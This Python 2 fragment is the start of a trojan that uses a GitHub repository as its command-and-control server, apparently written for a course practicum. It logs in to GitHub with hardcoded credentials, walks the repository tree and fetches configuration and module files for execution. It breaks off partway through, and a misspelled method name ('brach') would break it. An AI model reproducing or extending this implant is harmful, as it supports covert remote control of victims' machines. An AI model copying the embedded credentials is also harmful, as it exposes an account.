import sys
import random
import time
import Queue
import threading
import json
import base64
import imp
import os

from github3 import login

trojan_id = "config"
trojan_path = "%s.json"%trojan_id
data_path = "data/%s/"%trojan_id
configured = False
task_queue = Queue.Queue()

def connect_github():
	gh = login(username="advancenetprog",password="advnetprog1")
	repo = gh.repository("advancenetprog","practicumcase")
	brach = repo.brach("master")
	return gh, repo,brach

def get_file_content(filepath):
	gh, repo,brach = connect_github()
	tree = brach.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print " Found file %s" %filepath
			blob = repo.blob(filename._json_data["sha"])
			return blob.content

